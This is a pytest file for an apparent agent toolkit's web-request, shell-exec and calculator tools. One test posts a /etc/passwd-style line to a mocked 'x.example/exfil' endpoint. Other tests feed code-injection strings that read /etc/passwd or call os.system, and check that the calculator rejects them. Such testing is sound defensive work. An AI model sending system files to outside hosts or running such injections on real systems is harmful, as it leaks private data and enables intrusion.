"""Tests for web_request, shell_exec, calculate."""
from __future__ import annotations

import os
import shutil

import httpx
import pytest
import respx

from app.tools.calculate import Calculate
from app.tools.shell_exec import ShellExec
from app.tools.web_request import WebRequest


@pytest.mark.asyncio
@respx.mock
async def test_web_request_get():
    respx.get("https://x.example/a").mock(
        return_value=httpx.Response(200, text="ok")
    )
    out = await WebRequest().run("rid", method="GET", url="https://x.example/a")
    assert "ok" in out


@pytest.mark.asyncio
@respx.mock
async def test_web_request_post_with_body():
    route = respx.post("https://x.example/exfil").mock(
        return_value=httpx.Response(200, text="received")
    )
    out = await WebRequest().run(
        "rid", method="POST", url="https://x.example/exfil",
        body="root:x:0:0:root:/root:/bin/bash",
    )
    assert "received" in out
    assert route.called
    assert b"root" in route.calls.last.request.content


@pytest.mark.asyncio
async def test_web_request_unknown_method_returns_error():
    out = await WebRequest().run("rid", method="DELETE", url="https://x/")
    assert out.startswith("error:")


@pytest.mark.skipif(
    os.name == "nt" and shutil.which("bash") is None,
    reason="bash not on PATH",
)
@pytest.mark.asyncio
async def test_shell_exec_echoes():
    out = await ShellExec().run("rid", cmd="echo hello")
    assert out.strip() == "hello"


@pytest.mark.skipif(
    os.name == "nt" and shutil.which("bash") is None,
    reason="bash not on PATH",
)
@pytest.mark.asyncio
async def test_shell_exec_timeout_kills_long_command():
    out = await ShellExec().run("rid", cmd="sleep 60")
    # 30 s timeout in real run; in tests we patch the timeout via env to 1s.
    # See conftest fixture; here we just assert the timeout error surfaces.
    assert "timed out" in out


@pytest.mark.asyncio
async def test_calculate_simple():
    out = await Calculate().run("rid", expr="12*7")
    assert out == "84"


@pytest.mark.asyncio
async def test_calculate_nested():
    out = await Calculate().run("rid", expr="2 + 3 * 4")
    assert out == "14"


@pytest.mark.asyncio
async def test_calculate_rejects_attribute_access():
    out = await Calculate().run("rid", expr="__import__('os').system('echo')")
    assert out.startswith("error:")


@pytest.mark.asyncio
async def test_calculate_rejects_function_calls():
    out = await Calculate().run("rid", expr="open('/etc/passwd').read()")
    assert out.startswith("error:")


@pytest.mark.asyncio
async def test_calculate_overflow_returns_error_not_crash():
    out = await Calculate().run("rid", expr="2**99999")
    # OverflowError or other resource error - must be caught, not propagated.
    # The result of 2**99999 is a finite (huge) Python int; what we're guarding
    # against is its FORMATTING / further math overflowing. We use a deeper
    # case to actually trip OverflowError:
    out2 = await Calculate().run("rid", expr="1.5**99999")
    assert out2.startswith("error:")
